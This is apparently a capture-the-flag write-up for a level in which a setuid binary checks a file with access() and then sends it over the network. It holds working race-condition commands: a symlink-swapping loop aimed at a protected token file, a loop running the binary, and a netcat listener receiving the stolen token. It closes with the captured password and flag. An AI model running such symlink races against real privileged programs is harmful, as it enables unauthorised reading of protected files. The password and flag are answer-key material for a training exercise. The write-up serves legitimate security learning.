# Level 10

A quick reverse engineer of the binary shows us that the binary reads the file and send it to an host. Unlike the previous ones it checks that we have access to the file using the access function. This function has an exploit documented in its man

```
Using  these  calls  to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
```

We will do exactly that while listening to port 6969 which is the one the script is communicating with

```
nc -lk 6969
```

```
while true; do ln -sf /tmp/fake /tmp/goodlink; ln -sf /home/user/level10/token /tmp/goodlink; done
```
```
while true; do ./level10 /tmp/goodlink 10.0.2.15; done
```

**Password** : woupa2yuojeeaaed06riuj63c

**Flag** : feulo4b72j7edeahuete3no7c